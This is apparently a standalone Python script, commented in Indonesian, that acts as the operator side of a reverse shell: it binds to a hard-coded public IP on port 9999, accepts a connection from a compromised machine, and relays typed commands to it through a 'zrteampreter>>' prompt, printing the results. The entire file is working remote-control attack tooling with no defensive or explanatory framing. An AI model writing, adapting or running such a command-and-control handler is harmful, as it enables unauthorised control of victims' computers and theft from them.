import socket
import json
import os

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('24.199.99.159', 9999))
print('menunggu koneksi ...')
soc.listen(1)

koneksi = soc.accept()
_target = koneksi[0]
ip = koneksi[1]
print(_target)
print(f'Terhubung ke {str(ip)}')

def data_diterima():
    data = ''
    while True:
        try:
            data = data + _target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        
def komunikasi_shell():
    while True:
        perintah = input('zrteampreter>> ')
        data = json.dumps(perintah)
        _target.send(data.encode())
        if perintah in ('exit', 'quit'):
          break
        elif perintah == 'clear':
            os.system('clear')
        else:
            hasil = data_diterima()
            print(hasil)
        
komunikasi_shell()
